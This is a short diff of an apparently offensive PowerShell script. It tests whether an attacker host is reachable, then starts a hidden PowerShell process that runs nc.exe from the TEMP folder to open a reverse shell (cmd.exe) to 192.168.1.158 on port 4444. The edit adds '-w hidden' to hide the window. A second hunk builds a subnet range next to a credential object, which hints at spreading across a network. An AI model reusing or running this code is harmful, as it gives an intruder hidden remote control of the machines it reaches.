@@ -14,7 +14,7 @@ $an = (Test-NetConnection $atk -Port $p -ErrorAction SilentlyContinue).TcpTestSu
 if ($an -eq $true){
 
 Start-Sleep -Seconds 20
-Start-Process -WindowStyle Hidden powershell.exe "-nop $env:TEMP\nc.exe 192.168.1.158 $p -e cmd.exe"
+Start-Process powershell.exe  -WindowStyle Hidden -ArgumentList "-nop -w hidden $env:TEMP\nc.exe 192.168.1.158 4444 -e cmd.exe"
 
 }
 $p++
@@ -43,6 +43,7 @@ $mycredential = New-Object System.Management.Automation.PSCredential ($u, $secpa
     
     
     $subnetrange = $subnet.Substring(0,$subnet.IndexOf('.') + 1 + $subnet.Substring($subnet.IndexOf('.') + 1).IndexOf('.') + 3)
+    
 
     if ($isdot = $subnetrange.EndsWith('.') -eq $false){$subnetrange = $subnetrange + '.'}
     
